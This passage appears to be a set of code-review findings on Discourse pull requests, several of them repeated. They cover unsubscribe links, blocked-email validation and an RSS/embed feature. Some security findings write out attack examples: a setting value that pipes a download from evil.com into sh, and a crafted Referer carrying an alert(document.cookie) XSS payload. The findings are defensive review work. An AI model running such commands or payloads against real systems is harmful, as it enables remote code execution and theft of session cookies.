Any mailer (core or plugin) that sets `add_unsubscribe_link` without also supplying `unsubscribe_url` will now raise `I18n::MissingInterpolationArgument` and fail to send the email — the spec change in this PR (adding `unsubscribe_url: "/t/1234/unsubscribe"` so the existing test keeps passing) demonstrates exactly this breakage. Add a default for `unsubscribe_url` in `MessageBuilder#initialize` or only append the per-topic sentence when the option is present.

title: Unsubscribe confirmation text is wrong for watching/tracking topics
body: The server action downgrades `watching`/`tracking` to `regular` on the first visit and only sets `muted` when the level is already `regular` or lower, yet the page unconditionally says "You will stop receiving notifications for <topic>" (and the email says "To stop receiving notifications about this particular topic, click here"). A user who was watching a topic will still receive notifications for replies/mentions after following the link, so the message is factually wrong and the user has to click twice. Either mute unconditionally or make the text reflect the resulting notification level.

title: Unsubscribe link does not work for recipients without an active session
body: `:unsubscribe` is added to the `ensure_logged_in` filter, so a recipient who clicks the unsubscribe link in an email from a browser where they are not signed in gets a `Discourse::NotLoggedIn` (silent redirect to the homepage for HTML requests) and nothing is unsubscribed, with no explanation. Email unsubscribe links are routinely opened in a context without a session; the flow needs a signed per-user token in the URL (like the digest `DigestUnsubscribeKey`) rather than relying on the session cookie.

title: No specs for the new unsubscribe endpoint
body: The new `TopicsController#unsubscribe` action changes persisted user state and is reachable from every notification email, but no request/controller spec was added. Uncovered behaviours that are currently broken or risky: missing `TopicUser` row, the watching→regular vs regular→muted transition, the slug-mismatch 301 redirect, anonymous access, and the JSON vs HTML response paths. Only `spec/components/email/message_builder_spec.rb` was touched.

title: Template path likely not resolvable for the topicUnsubscribe route
body: The route is registered as `topicUnsubscribe` and its controller/view are named `topic-unsubscribe`, which the Discourse resolver looks up as `topicUnsubscribe` / `topic_unsubscribe` / `topic-unsubscribe`. This template is registered under the key `topic/unsubscribe` (because of its directory), which does not match any of those forms, so the route may render an empty outlet. Either move the file to `templates/topic-unsubscribe.hbs` or set `renderTemplate`/`templateName` explicitly.

title: Setting the computed notificationReasonText has no effect
body: `topic.set("details.notificationReasonText", null)` targets `notificationReasonText`, which is a computed property on the topic-details model (derived from `notification_level`/`notifications_reason_id`) with no setter. Assigning to it will not clear the displayed text (in Ember 1.x the getter is re-invoked and its return value cached; in later Ember versions it throws), so the stated intent of hiding the notification reason is not achieved. Use a flag that the component/template checks instead.

title: Blocked-email lookup is case sensitive, so the block list is trivially bypassed
body: `BlockedEmail.should_block?` looks the address up with `BlockedEmail.where(email: email).first`, an exact, case-sensitive comparison, and nothing in the model or the migration normalizes the stored address either. Sign-up emails are not downcased before validation (`User.new_from_params` assigns `params[:email]` verbatim), so an address blocked as `bad@spam.com` passes validation when submitted as `Bad@Spam.com`. The unique index on `blocked_emails.email` is also case sensitive, so duplicate case variants can be stored. Both the stored value and the lookup should be downcased (or the comparison made case-insensitive) for the feature to actually block anything.

title: Match statistics written during validation are rolled back when the save fails
body: `should_block?` performs `record.save` to bump `match_count`/`last_match_at`, and it is invoked from `EmailValidator#validate_each`, i.e. inside `User#save`'s validation step. ActiveRecord wraps `save` in a transaction and issues `ActiveRecord::Rollback` when validation returns false, so in the normal blocking path (validation fails → save returns false) the statistics update is rolled back and `match_count`/`last_match_at` are never persisted — exactly the case the model and `blocked_email_spec` claim to record. The counters should be updated outside the record's transaction (e.g. in a separate connection/`update_all` after validation, or from the controller) rather than as a side effect of a validator.

title: Validator side effect causes match_count to be incremented more than once per signup
body: `validate_each` calls `BlockedEmail.should_block?`, which writes to the database. Validation is not idempotent for callers: `UsersController#create` calls `user.valid?` (line 168) and then `user.save` (line 172), so the blocked-email counters are incremented twice for a single sign-up attempt, and any other code path that validates a user more than once inflates the counters further. Counting should happen once per attempt, outside the validation callback.

title: Non-atomic match_count increment loses updates and silently ignores save failures
body: `record.match_count += 1; record.save` is a read-modify-write: two concurrent sign-up attempts with the same blocked address both read the same value and write the same incremented value, so one match is lost. Additionally the return value of `save` is discarded, so a failed save (e.g. a validation error on a legacy row with a blank email) silently drops the statistics. Use an atomic SQL increment (`increment!`/`update_all("match_count = match_count + 1")`) instead.

title: action_type is NOT NULL with no database default
body: `action_type` is declared `null: false` without a default; the default value is only applied by the model's `before_validation :set_defaults`. The spec for this feature explicitly anticipates the table being "manually loaded with some emails" — any such bulk insert or raw SQL insert that omits `action_type` will fail with a NOT NULL violation. Adding `default: 1` (the `:block` value) to the column would make the intended default hold at the database level.

title: Mutable array declared on the controller prototype is shared between instances
body: `rejectedEmails: Em.A([])` puts a single array object on the class prototype, so every instance created from `Discourse.CreateAccountController` mutates the same array via `pushObject`. If more than one instance is ever created (or the container is reset, e.g. in tests), rejected emails leak across instances and are never cleared. The array should be initialised per instance (e.g. in `init`) or stored as `null` and lazily created.

title: Server-rejected email is reported to the user as "invalid"
body: When an email is in `rejectedEmails` the field validation shows `I18n.t('user.email.invalid')`, i.e. the "email address is invalid" message, even though the server rejected it because it is blocked or already taken. After the flash message disappears the user is left with a message telling them their address is malformed, which will send them down the wrong path. The server-provided error message (`result.errors.email`) should be surfaced instead of a generic format error.

title: New validator spec only covers the stubbed blocked-email branch
body: The spec stubs `BlockedEmail.should_block?` entirely, so nothing exercises the real lookup (including the case-sensitivity problem), nothing verifies that a `User` with a blocked email actually fails to save, and the whitelist/blacklist branches that were moved out of `User#email_validator` into this new class have no coverage here. A regression in the moved whitelist/blacklist code or in the interaction between the validator and `BlockedEmail` would not be caught.

title: Non-atomic read-modify-write of match_count loses increments and writes during validation
body: `should_block?` loads the record, does `record.match_count += 1` in Ruby and then `record.save`. Two concurrent signups using the same blocked address read the same `match_count` and both write the same incremented value, so increments are silently lost. It also issues an UPDATE of the whole row (including `updated_at`) from inside a read-only predicate. Use an atomic SQL update (e.g. `BlockedEmail.where(id: record.id).update_all("match_count = match_count + 1, last_match_at = ...")` or `increment!`) so the statistic is correct under concurrency.

title: Blocked-email lookup is exact/case-sensitive, so the block is trivially bypassed
body: `BlockedEmail.where(email: email).first` performs an exact string comparison. Nothing in this model (or in `User.new_from_params`, which assigns `params[:email]` verbatim) normalizes case or strips whitespace, and the unique index added in the migration is on the raw column. An admin blocking `spammer@example.com` will not block a signup with `Spammer@Example.com`, and blocking `Spammer@Example.com` will not block the lowercase form. Downcase/strip the email both when persisting a BlockedEmail and when looking it up (consistent with `Email.downcase` used elsewhere).

title: Validator performs a database write, so match statistics are double counted and can be rolled back
body: `BlockedEmail.should_block?` mutates and saves the BlockedEmail row, and it is invoked from `validate_each`. `UsersController#create` calls `user.valid?` (for the Discourse Hub check) and then `user.save`, so validation runs twice for a single signup attempt and `match_count` is incremented twice. Worse, the increment that happens during `save` runs inside the user's save transaction, so it is rolled back if the insert fails, while the increment from the earlier `valid?` persists — making the counter and `last_match_at` unreliable. Move the side effect out of validation (e.g. record the match in the controller/flow after the check) or make the counter update happen outside the AR transaction.

title: rejectedEmails array is declared on the class and shared/never reset
body: `rejectedEmails: Em.A([])` puts a single mutable array on the controller's prototype, so every instance of `CreateAccountController` shares the same array object and `pushObject` mutates shared state. In addition the list is never cleared, so an email rejected once stays flagged as invalid for the lifetime of the page even if the server-side reason no longer applies (e.g. the whitelist setting changed, or the user corrects an unrelated field and retries). Initialize it per-instance (in `init`) and clear it when the modal is opened.

title: Any email error from the server is reported to the user as "invalid"
body: Every server-side email error (already-taken address, domain whitelist/blacklist rejection, blocked email) causes the email to be pushed into `rejectedEmails`, and `emailValidation` then renders the generic `user.email.invalid` reason. The actual server message (which is only shown transiently in the flash) is discarded, so users retyping the form see a misleading "invalid email" message for reasons such as "email already registered". Consider storing the server reason alongside the rejected email and displaying it.

title: No coverage for the whitelist/blacklist logic moved out of User, nor for the model wiring
body: The whitelist/blacklist validation was moved from `User#email_validator` into this new `EmailValidator`, but the only specs added stub `BlockedEmail.should_block?` and exercise the blocked branch. There is no test for `email_domains_whitelist`/`email_domains_blacklist` behaviour in its new home, no test that an existing error on `:email` short-circuits the blocked check (the `record.errors[attribute].blank?` guard), and no test that `User` actually rejects a blocked email end-to-end via `validates :email, email: true`. A regression in the moved code or in the model wiring would go unnoticed.

title: Blocked-email lookup is case-sensitive, so the block is trivially bypassed
body: `BlockedEmail.should_block?` does an exact-match lookup (`where(email: email).first`) and nothing in the model or migration normalizes the stored or queried address (no `before_validation` downcase, no case-insensitive index). `User` passes the raw `params[:email]` through `User.new_from_params`, so a user blocked as `bad@spamclub.com` can register as `Bad@spamclub.com` or `BAD@SPAMCLUB.COM` and will not be blocked. The uniqueness validation on `BlockedEmail#email` is likewise case-sensitive, so two rows differing only by case can coexist and give inconsistent results. The address should be downcased on write and on lookup (and the unique index built on the normalized value).

title: match_count incremented with a non-atomic read-modify-write
body: `record.match_count += 1; record.save` reads the counter in Ruby and writes it back. Two concurrent signup attempts using the same blocked address will both read the same value and write the same incremented value, so matches are silently lost. Worse, `save` runs the full validation chain (including the uniqueness SELECT) on every email check. Use an atomic SQL update such as `BlockedEmail.where(id: record.id).update_all("match_count = match_count + 1, last_match_at = ...")` (or `increment!`) instead.

title: Statistics write inside a validation is rolled back on block and double-counted otherwise
body: `should_block?` performs a database write, but it is invoked from `EmailValidator#validate_each`, i.e. from inside `User#valid?`/`User#save`. Two consequences: (1) when the email *is* blocked, `user.save` fails, and because ActiveRecord wraps validations in the save transaction and rolls it back when the status is false, the `match_count`/`last_match_at` update made during that save is discarded — the very case the statistics are meant to record is lost; (2) `UsersController#create` calls `user.valid?` and then `user.save`, so the validator runs twice per request and an entry with `action_type = :do_nothing` gets `match_count` incremented twice for a single signup attempt. The counter is therefore unreliable. The match bookkeeping should happen outside the validation (e.g. in the controller/creator after the check) or at least be made idempotent per request.

title: No validation that action_type is a known action
body: `action_type` is only defaulted in `set_defaults`; there is no `validates :action_type, inclusion: {in: actions.values}`. Any out-of-range integer (e.g. loaded by a bulk import or admin script, since the column is `null: false` with no DB default) makes `should_block?` return false, so the row silently never blocks anything and the misconfiguration is invisible.

title: No test exercises the real blocking path or the relocated whitelist/blacklist logic
body: Both examples stub `BlockedEmail.should_block?`, so nothing verifies that a real `BlockedEmail` row causes `User#valid?` to fail, that the error message key `user.email.blocked` resolves, or that a differently-cased address is (not) matched. In addition, the whitelist/blacklist logic was moved verbatim from `User#email_validator` into this new class and has no spec here; a regression in `email_in_restriction_setting?` (e.g. the nil-value path when email is blank) would go unnoticed. Add at least one end-to-end spec creating a `BlockedEmail` fabricator and asserting the user is invalid, plus whitelist/blacklist examples.

title: rejectedEmails array is defined on the class prototype and shared/never reset
body: `rejectedEmails: Em.A([])` is evaluated once when the class is defined, so the array object is shared by every instance of `CreateAccountController` and is mutated in place by `pushObject`. State leaks across instances (and across modal opens within a page lifetime), and the list is never cleared when the modal is closed. Initialize it per instance (e.g. in `init`, or `rejectedEmails: function(){ return Em.A([]); }.property()`) and clear it when the modal is reopened.

title: Any email error permanently marks the address invalid with a misleading message
body: The client pushes `result.values.email` into `rejectedEmails` whenever `result.errors.email` is present, and `emailValidation` then reports `user.email.invalid` ("Email is invalid"). Since the server now returns the whole errors hash, this also triggers for errors like "Email has already been taken" or a domain whitelist rejection: the user is told the address is malformed instead of the real reason, and the address stays permanently un-submittable for the life of the controller even if the condition was transient. Use the server-supplied error message as the reason rather than the generic `invalid` string.

title: Feed content is stored as pre-cooked HTML with no sanitization (stored XSS)
body: `poll_feed` takes `i.content` straight from the remote RSS/Atom feed, runs `CGI.unescapeHTML` on it and hands it to `TopicEmbed.import`, which creates the post with `cook_method: Post.cook_methods[:raw_html]`. `Post#cook` (app/models/post.rb:133) then returns `raw` verbatim as `cooked`, completely bypassing PrettyText/the HTML sanitizer. The resulting HTML is rendered unescaped both in the Ember client (`{{{cooked}}}`) and in app/views/embed/best.html.erb (`raw post.cooked`). Any `<script>`, `onerror=`, `<iframe>` etc. present in the feed (compromised blog, feed that republishes user-submitted content, man-in-the-middle on a plain-HTTP feed URL) executes in the browsers of all forum users, including admins. The feed HTML should be run through the same sanitizer/whitelist that `import_remote` applies via Readability's tag/attribute whitelist before being stored as cooked output.

title: `<%- end if %>` typo makes the header conditional depend on the logo link expression
body: Line 6 reads `<%- end if %>` instead of `<%- end %>`. The generated template code becomes `end if` followed by the next emitted statement, which Ruby parses as a modifier-`if` whose condition is the *next* expression (the `link_to(image_tag(SiteSetting.logo_url ...))` on line 8). As a result the logo is evaluated/appended before the Discussion/Start-Discussion button, the ordering in the rendered header is reversed, and the whole if/else block is gated on the truthiness of a side-effecting buffer append. It is also one token away from an outright `SyntaxError` in this template (which would 500 the main embed action). Change it to `<%- end %>`.

title: Re-import crashes when the embedded post has been deleted
body: In the update branch, `post = embed.post` is used directly by `PostRevisor.new(post)`. `Post` includes `Trashable`, so a soft-deleted (or hard-deleted) post makes `embed.post` return `nil`, and `PostRevisor#revise!` then raises `NoMethodError` on `nil.raw`. Any topic/post that a moderator deletes will therefore make every subsequent feed poll or embed retrieval for that URL blow up (and, since `Jobs::PollFeed` has `retry: false` and no per-item rescue, abort the rest of the feed). Guard for a missing post and either skip or recreate the topic.

title: Nil/absent feed item content aborts the whole poll
body: `i.content.scrub` assumes every item exposes `content`. Plain RSS 2.0 feeds commonly only provide `description` (SimpleRSS returns `nil` for `content`/`content_encoded`), so this raises `NoMethodError` on `nil`. Because the loop has no per-item rescue and the job is declared `sidekiq_options retry: false`, a single such item silently aborts the import of the entire feed (and all later items). Fall back to `description`/`summary` and wrap each item so one bad entry does not kill the run.

title: Kernel#open on a site-setting URL allows command execution and SSRF
body: `open(SiteSetting.feed_polling_url)` uses `Kernel#open`, which executes a subprocess when the argument starts with `|` (e.g. `feed_polling_url = "|curl evil.com/x.sh|sh"`), and will happily read local files/internal addresses otherwise. Even though the setting is admin-only, a single compromised/misconfigured setting turns into remote code execution on the Sidekiq host. Use `URI.parse(url).open` (or an explicit HTTP client) and validate the scheme is http/https. The same concern applies to `open(url)` in `TopicEmbed.import_remote`.

title: `import_remote` calls `open(url)` without requiring open-uri
body: `import_remote` only does `require 'ruby-readability'`; it never requires `open-uri`. If nothing else in the process has loaded open-uri (e.g. `app/jobs/scheduled/poll_feed.rb`, which does require it, has not been autoloaded yet), `open(url)` falls back to `Kernel#open` as a file open and raises `Errno::ENOENT` for an http URL. This path is reached from `Jobs::RetrieveTopic` -> `TopicRetriever#fetch_http` and from the disqus thor task, so embed retrieval can fail non-deterministically depending on load order. Add `require 'open-uri'` (preferably `URI.parse(url).open`).

title: New embed.css/embed.js assets are not added to the precompile list
body: `stylesheet_link_tag 'embed'` references the newly added `app/assets/stylesheets/embed.css.scss`, and `app/assets/javascripts/embed.js` is meant to be served to third-party sites, but neither file is reachable from `application.css`/`application.js` and the PR does not add them to `config.assets.precompile` in `config/application.rb`. With Sprockets in production (`assets.compile = false`) this raises an "asset is not present in the asset pipeline / not precompiled" error, so the embed page will 500 and the embed snippet will 404 after deploy.

title: Two PollFeed guard tests pass vacuously
body: "requires feed_polling_url" (line 18) and "requires embed_by_username" (line 24) only stub the one setting they are about; `feed_polling_enabled?` is left at its default, which is `false` in config/site_settings.yml. The first condition in `execute` therefore short-circuits and `poll_feed` would not be called even if the url/username guards were removed entirely, so these two examples assert nothing. Stub `feed_polling_enabled?` to true in both, and add coverage for `poll_feed` itself (item parsing, nil content, import call), which is currently untested.

title: `import` mutates the caller's `contents` string
body: `contents << "\n<hr>..."` appends the "Imported from" footer in place rather than building a new string. Callers that reuse or memoize the string (e.g. a `let(:contents)` in specs, or any retry loop) will get the footer appended repeatedly, and the computed `content_sha1` will differ run to run for identical input, causing spurious "content changed" revisions. A frozen string argument would raise `RuntimeError`. Use `contents = contents + "..."` / `contents.dup`.

title: postMessage origin check uses substring matching
body: `if (discourseUrl.indexOf(e.origin) === -1) { return; }` accepts any `e.origin` that is a substring of the configured `discourseUrl` (and also silently accepts `e.origin === ''`, since `indexOf('')` is 0). This is not an origin comparison; it should compare `e.origin` against the exact origin derived from `discourseUrl`. The current check weakens the only authentication on the resize messages and will also mis-handle a `discourseUrl` without a trailing slash (line 7 concatenates `"embed/best"` directly onto it, producing a wrong iframe src).

title: SETNX followed by EXPIRE can leave a permanent throttle key
body: `$redis.setnx(retrieved_key, "1")` and `$redis.expire(retrieved_key, 60)` are two round trips; if the process dies or the connection drops between them the key exists with no TTL and that embed URL is throttled forever, so the topic can never be retrieved. Use a single atomic `set(key, "1", ex: 60, nx: true)`.

title: One Sidekiq job enqueued per request for an unknown embed_url
body: Every request for an embed_url without a topic enqueues `Jobs::RetrieveTopic`; throttling happens only inside the job (`TopicRetriever#retrieved_recently?`). Since the endpoint is anonymous and unauthenticated (only a Referer check), a client hitting `embed/best` in a loop—or the loading page's unconditional 30s reload for many visitors—can flood the queue with jobs that all immediately no-op. Consider rate limiting the enqueue (e.g. check the same redis key before enqueueing).

title: Already-committed migration changed to `create_table ... force: true`
body: Editing an existing migration to add `force: true` means that on any database where `top_topics` exists but this migration version is not recorded (partially migrated/restored DB, schema loaded from schema.rb), running migrations will silently `DROP TABLE top_topics` and recreate it, losing data. Changing a released migration also makes checksum/history divergence between installs. If a reset is really needed, add a new migration instead.

title: No coverage renders the new embed views
body: The controller spec stubs `TopicView.new` (returning nil) and Rails controller specs do not render views unless `render_views` is enabled, so neither `embed/best.html.erb` nor `layouts/embed.html.erb` is ever exercised. That is why the `<%- end if %>` defect on best.html.erb:6 and the `@topic_view` usage are unverified. Add a `render_views` example with a real topic so template errors are caught.

title: embed_url limited to 255 chars with a unique index
body: `t.string :embed_url` defaults to varchar(255) in Postgres and is also the unique index column. Feed/article URLs regularly exceed 255 characters (tracking params, long slugs), which makes `TopicEmbed.create!` raise `PG::StringDataRightTruncation` inside the import transaction and permanently prevents embedding those pages. Use `:text` (with an index on the value or a hash) or document the limit and truncate/validate explicitly.

title: Unescaped request.referer interpolated into inline JavaScript (XSS)
body: The embed layout writes `parent.postMessage({...}, '<%= request.referer %>')`, injecting the raw `Referer` request header into a single-quoted JS string literal with no escaping (no `j`/`escape_javascript`, and ERB's HTML escaping does not help inside a JS string). The only validation performed is `EmbedController#ensure_embeddable`, which checks the *host* of the referer; the path, query and fragment are free-form and may legally contain `'`, so an attacker who can get a victim to load `embed/best` with a crafted Referer (e.g. `http://<embeddable_host>/#'+alert(document.cookie)+'`) gets script execution in the forum's origin. Escape with `escape_javascript` (or, better, compute and emit only the scheme+host origin).

title: Feed HTML stored as raw_html and rendered unescaped (stored XSS)
body: Feed item bodies are run through `CGI.unescapeHTML` (turning `<script>` back into real tags) and handed to `TopicEmbed.import`, which creates the post with `cook_method: Post.cook_methods[:raw_html]`. `Post#cook` then returns `raw` verbatim (app/models/post.rb:133) and the embed view renders it with `<%= raw post.cooked %>` (app/views/embed/best.html.erb:19), as does the normal topic view. No sanitization step exists anywhere in this path, so any script/iframe/onerror payload in a polled RSS/Atom feed (or in a compromised/hijacked feed URL) becomes stored XSS for every forum visitor. The raw HTML should be sanitized (e.g. via `Sanitize`/the existing allowed-tag whitelist) before being stored as `raw_html`.

title: `<%- end if %>` produces a stray modifier-if that breaks the header block
body: Line 6 emits the Ruby code `end if` instead of `end`. The compiled template therefore becomes `if ... else ... end if <next generated statement>`, i.e. the whole if/else expression turns into a modifier-if whose condition is the following generated line (the logo `link_to` append). Depending on the ERB compiler this either raises a syntax error when the template is compiled (500 on every embed request) or silently reorders the output so the logo is appended before the button. Change it to `<%- end %>`.

title: `i.content` is nil for RSS 2.0 feeds, raising NoMethodError and killing the job
body: `content = CGI.unescapeHTML(i.content.scrub)` assumes every feed item exposes a `content` field. SimpleRSS returns nil for keys that are absent, and RSS 2.0 items carry the body in `description` (Atom uses `content`/`summary`). For a plain RSS feed this raises `NoMethodError: undefined method 'scrub' for nil`. Because the job is declared `sidekiq_options retry: false`, the whole hourly poll aborts on the first such item and nothing is imported, with no fallback. Fall back to `i.description`/`i.summary` and skip items with blank content.

title: Kernel#open on a site-setting URL allows command execution and has no timeouts
body: `SimpleRSS.parse open(SiteSetting.feed_polling_url)` uses `Kernel#open` with open-uri semantics: a value beginning with `|` (e.g. `|curl evil.com/x | sh`) is executed as a shell command, so an admin-editable (and, in multisite setups, potentially less-trusted) site setting becomes remote command execution in the Sidekiq process. There is also no read/open timeout or size limit, so a slow or huge feed can hang the worker indefinitely. Validate the scheme (http/https only) and fetch with `URI.parse(...).open` / a real HTTP client with timeouts.

title: Anonymous requests can trigger unbounded remote fetches and topic creation for arbitrary URLs
body: `best` enqueues `Jobs::RetrieveTopic` for any `embed_url` whose host matches `embeddable_host`, with no authentication required. `TopicRetriever` only throttles per exact URL (60s), so a client can iterate over arbitrary paths/query strings on the embeddable host (`?x=1`, `?x=2`, ...) and cause the forum to (a) create an unbounded number of redis throttle keys, (b) issue an unbounded number of outbound HTTP fetches, and (c) create a new topic/post per distinct URL, including for 404/garbage pages. A global rate limit (per IP and/or per site) and a check that the retrieved page is a real article are needed.

title: `post.present?` does not mean the post was saved; can violate NOT NULL on topic_embeds
body: `PostCreator#create` returns the (possibly unsaved) `@post` object even when validation fails — `save_post` raises `ActiveRecord::Rollback`, which inside this nested `Topic.transaction` block is swallowed rather than rolling back. `post.present?` is therefore true for an unsaved record, and `TopicEmbed.create!(topic_id: post.topic_id, post_id: post.id, ...)` runs with nil ids, violating the `null: false` constraints added in 20131217174004 and raising a StatementInvalid out of the job. Check `post.try(:persisted?)` / `creator.errors.blank?` instead.

title: New embed assets are not added to the asset precompile list
body: The layout references `stylesheet_link_tag 'embed'` and the new `app/assets/javascripts/embed.js` is meant to be served to third-party sites, but neither asset is added to `config.assets.precompile` (no change to config/application.rb or an initializer in this PR). Discourse precompiles an explicit whitelist, so in production `embed.css` / `embed.js` will not exist and every `embed/best` request will raise `Sprockets::Rails::Helper::AssetNotPrecompiled` / 500. Add both files to the precompile list.

title: `force: true` added to an already-committed migration can drop a populated table
body: This migration existed before the PR and has already run on deployed installs; adding `force: true` has no effect there, but it makes the migration destructive if it is ever re-run (e.g. after a `rake db:migrate:redo`, a rollback/re-apply, or a schema reload), because `create_table ... force: true` issues a `DROP TABLE top_topics` first and silently discards the existing rows. The same pattern is used for the new `topic_embeds` table (db/migrate/20131217174004_create_topic_embeds.rb:3). `force: true` should not be used in migrations.

title: import mutates the caller's `contents` string
body: `contents << "\n<hr>..."` appends the attribution footer in place, so the caller's string object is modified as a side effect (e.g. the `content` local in PollFeed, or anything a plugin/thor task passes in). If a frozen or shared string is passed the call raises `RuntimeError: can't modify frozen String`, and repeated calls with the same object accumulate footers. Use `contents = contents + "..."` / `+=`.

title: absolutize_urls mangles protocol-relative URLs and ignores path-relative ones
body: The check `href.start_with?('/')` also matches protocol-relative URLs such as `//cdn.example.com/x.png`; `sub(/^\/+/, '')` then strips both slashes producing `http://feedhost/cdn.example.com/x.png`, i.e. a broken link/image for every protocol-relative asset in a feed (very common for CDN-hosted images). Conversely, truly relative references (`images/x.png`, `../x`) are left untouched and will resolve against the Discourse host. Resolving with `URI.join(url, href)` handles all of these cases correctly.

title: setnx followed by a separate expire can leave a permanent throttle key
body: `$redis.setnx(key, "1")` and `$redis.expire(key, 60)` are two round trips; if the process dies (or redis fails) between them, the key is left with no TTL and `retrieved_recently?` returns true forever, permanently blocking retrieval of that embed URL for non-staff users. Use a single atomic `SET key 1 NX EX 60`.

title: postMessage origin check uses substring matching instead of comparing origins
body: `if (discourseUrl.indexOf(e.origin) === -1) { return; }` accepts any `event.origin` that happens to be a substring of the configured `discourseUrl` (and would silently accept everything if `discourseUrl` were ever empty). Derive the expected origin from `discourseUrl` (scheme + host + optional port) and compare it with `e.origin` for strict equality, so only the forum frame can resize the iframe.

title: Negative PollFeed specs pass vacuously
body: `feed_polling_enabled` defaults to false (config/site_settings.yml), so the "requires feed_polling_url" and "requires embed_by_username" examples would pass even if those two conditions were removed from `execute` — the first condition already short-circuits. Each example should stub the other settings to valid values so that only the condition under test is false. Note also that `poll_feed` itself (feed parsing, url fallback, content handling) has no test coverage at all.

title: "is 404 without an embed_url" does not exercise the missing-parameter path
body: `embeddable_host` defaults to `''`, so `ensure_embeddable` raises `Discourse::InvalidAccess` before the action (and thus before `params.require(:embed_url)`) ever runs. The example passes for the wrong reason and gives no coverage of the missing-parameter behaviour; it also asserts only `should_not be_success` rather than the claimed 404. Stub `embeddable_host` and a matching referer, then assert the actual status returned for a missing `embed_url`.

title: import_remote calls open() without requiring open-uri
body: `open(url).read` relies on open-uri being loaded, but topic_embed.rb only requires nokogiri; the `require 'open-uri'` lives in app/jobs/scheduled/poll_feed.rb. When `import_remote` is reached via `Jobs::RetrieveTopic` -> `TopicRetriever` (neither of which loads poll_feed or open-uri), `open` is plain `Kernel#open` and an http URL fails with `Errno::ENOENT`. Add `require 'open-uri'` to this file (and prefer `URI.parse(url).open` so a `|command` string can never be executed).

title: Only the Rails 4 lockfile was regenerated for the new gems
body: `ruby-readability` and `simple-rss` are added unconditionally to the Gemfile, but only `Gemfile_rails4.lock` is updated. The Gemfile explicitly supports dual-booting (RAILS3 / RAILS_MASTER) with separate lockfiles, so booting in those modes will hit an out-of-sync lockfile and require a `bundle install` (or fail in deployment/frozen mode). Regenerate the other lockfiles as part of this change.

title: Stray `if` in `<%- end if %>` corrupts the compiled template
body: The closing tag of the header conditional is written as `<%- end if %>` instead of `<%- end %>`. The extra `if` is compiled into Ruby as `end if <next emitted expression>`, i.e. the whole if/else block becomes the body of a modifier-`if` whose condition is whatever ERB happens to emit next (currently a whitespace `safe_append`). At best this works by accident and the header is rendered conditionally on an unrelated expression; a small change to surrounding whitespace/markup can turn it into a SyntaxError raised while rendering the embed page. Nothing catches this because controller specs do not render views (`render_views` is not enabled in spec/controllers/embed_controller_spec.rb).

title: Feed HTML is stored and rendered unsanitized (stored XSS)
body: `poll_feed` takes `i.content`, runs `CGI.unescapeHTML` on it (turning escaped markup back into live HTML) and passes it to `TopicEmbed.import`, which creates the post with `cook_method: Post.cook_methods[:raw_html]`. `Post#cook` (app/models/post.rb:133) then returns `raw` verbatim, so the feed HTML is stored in `cooked` with no sanitization and is later emitted with `raw post.cooked` (app/views/embed/best.html.erb:19) and by the normal topic rendering. Any `<script>`, `onerror=`, or `javascript:` payload in the polled feed becomes persistent script execution on the forum for every visitor. The content should be run through the same whitelist/sanitizer used for `import_remote` (and `javascript:` hrefs stripped) before being trusted as raw HTML.

title: poll_feed crashes on feed items without `content`
body: `i.content.scrub` assumes every item exposes a non-nil `content`. Plain RSS 2.0 feeds commonly only provide `description` (SimpleRSS exposes `content` only for Atom `content` / `content:encoded`), so `i.content` is nil and the job raises NoMethodError. Because the job is declared with `sidekiq_options retry: false`, the whole hourly poll aborts on the first such item and every remaining item in the feed is silently dropped. The same applies to `i.title`, which `TopicEmbed.import` passes to `PostCreator` as the topic title.

title: Non-atomic SETNX/EXPIRE can permanently block retrieval of an embed URL
body: `$redis.setnx(key, "1")` followed by a separate `$redis.expire(key, 60)` is not atomic. If the process dies, the Redis connection drops, or the EXPIRE command fails between the two calls, the throttle key is left with no TTL and `retrieved_recently?` will return true forever for that embed URL, so the topic for that URL can never be retrieved again (the embed page will loop on the loading screen indefinitely). Use a single atomic command, e.g. `$redis.set(key, "1", ex: 60, nx: true)`.

title: absolutize_urls corrupts protocol-relative URLs
body: `href.start_with?('/')` is also true for protocol-relative URLs such as `//cdn.example.com/img.png`. The rewrite then strips all leading slashes (`sub(/^\/+/, '')`) and prefixes the embed host, turning `//cdn.example.com/img.png` into `http://embedhost/cdn.example.com/img.png`, i.e. working absolute links/images in imported articles become broken links. The same bug applies to the `img` loop at lines 68-73. Protocol-relative URLs should be left alone (or only given a scheme), and relative URLs without a leading slash (`images/x.png`) are not handled at all — `URI.join` would handle all of these cases correctly.

title: TopicEmbed created from a post that may not have been saved; unique-index race unhandled
body: `creator.create` returns the (possibly unsaved) Post instance even when creation failed — PostCreator rolls back and returns `@post` carrying errors — so `post.present?` is true while `post.id` and `post.topic_id` are nil. `TopicEmbed.create!` then violates the NOT NULL constraints on `topic_id`/`post_id` and raises inside the job instead of failing gracefully; use `post.persisted?`. Additionally, `embed_url` has a unique index (db/migrate/20131217174004), and two concurrent retrievals for the same URL (the existence check in TopicRetriever#perform_retrieve is a plain read) will make one of them blow up with ActiveRecord::RecordNotUnique; that case should be rescued and treated as "already imported".

title: `import` mutates the caller's contents string
body: `contents << "...imported_from..."` appends to the string object passed in by the caller rather than building a new string. Callers that reuse the string (or pass a frozen/literal string, which raises `RuntimeError: can't modify frozen String`) get surprising behaviour, and calling `import` twice with the same object appends the footer twice. Build a new string instead (`contents = contents + ...`).

title: request.referer interpolated into a JS string literal and used as postMessage targetOrigin
body: `parent.postMessage({...}, '<%= request.referer %>')` injects a client-controlled header into inline JavaScript. ERB's HTML escaping does not apply to characters that matter inside a `<script>` block (a backslash is not escaped, and escaped entities are not decoded inside script elements), so a crafted Referer can break the surrounding string literal and produce a JS syntax error, and the full referer URL (path, query) is used where only an origin is meaningful. Derive the target origin from the validated host instead, e.g. `"#{uri.scheme}://#{uri.host}"` built from the parsed referer and JSON/JS-escaped.

title: postMessage origin check uses substring matching
body: `if (discourseUrl.indexOf(e.origin) === -1) { return; }` accepts any message whose origin happens to be a substring of the configured `discourseUrl` instead of comparing origins for equality. This is fragile (e.g. a configured URL containing a path or a longer host can make unintended origins match) and silently accepts messages that should be rejected, letting a third party resize the frame. Compare `e.origin` against the exact origin parsed out of `discourseUrl`.

title: New embed.css / embed.js assets are not added to the precompile list
body: The layout references `stylesheet_link_tag 'embed'` and the whole feature depends on third-party sites loading `embed.js` directly, but neither `embed.css` nor `embed.js` is a Sprockets entry point reachable from `application.js`/`application.css`, and this PR does not add them to `config.assets.precompile` (config/application.rb is untouched). In production with asset digests/compilation this raises `Asset was not declared to be precompiled in production` when the embed page is rendered and `embed.js` will 404 for embedding sites.

title: "is 404 without an embed_url" passes for the wrong reason
